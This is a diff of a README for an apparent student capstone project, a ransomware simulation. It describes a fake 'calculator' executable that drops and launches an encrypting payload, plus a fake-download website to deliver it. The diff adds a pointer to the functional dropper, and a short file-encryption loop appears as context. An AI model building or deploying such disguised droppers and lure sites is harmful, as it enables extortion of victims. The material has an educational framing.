@@ -1,34 +1,32 @@
-Thought for a second
+# Ransomware Simulation with Deployment Methods and Mitigation Strategies
 
-
-````markdown
-# Capstone Project: Ransomware Simulation & Delivery
-
-**Author:** Aimery Barrault  
-**Course:** CSCI 460 – Capstone  
+**Author:** Aimery Barrault
+**Course:** CSCI 460 – Capstone
 
 ---
 
 ## 🚀 Project Overview
 
-This repository contains a controlled, educational ransomware simulation.  
+This repository contains a controlled, educational ransomware simulation.
+
 > **Warning:** Do **not** deploy on production systems or without explicit authorization.
 
-- **CalculatorApp.exe**  
+* **CalculatorApp.exe**
   A benign “calculator” UI that embeds, drops, and launches the real payload.
-- **capstone-site/**  
+* **capstone-site/**
   A Next.js “fake download” website used to deliver the payload.
-- **payload.txt** & **base64script.py**  
+* **payload.txt** & **base64script.py**
   Utilities to embed and extract the encrypted dropper.
 
 ---
 
 ## ⚙️ Fake-Download Site Setup
 
-1. **Change into the site directory**  
+1. **Change into the site directory**
+
    ```bash
    cd capstone-site
-````
+   ```
 
 2. **Install dependencies**
 
@@ -44,6 +42,8 @@ This repository contains a controlled, educational ransomware simulation.
    ```
    capstone-site/public/Downloads
    ```
+
+   > **Note:** The functional dropper executable can also be found directly at `capstone-site/public/Downloads/CalculatorApp.exe` for convenience.
 
 4. **Run in development mode**
 
@@ -97,7 +97,7 @@ private void SafeEncryptDirectory(string dir, byte[] aesKey, string self)
 {
     string[] files;
     try { files = Directory.GetFiles(dir); }
-    catch { return; } 
+    catch { return; }
 
     foreach (var f in files)
     {
@@ -163,6 +163,3 @@ This software is provided **as-is** for **educational purposes only**. Misuse wi
 ## 📜 License
 
 This project is released under the MIT License. See [LICENSE.md](LICENSE.md) for full terms.
-
-```
-```
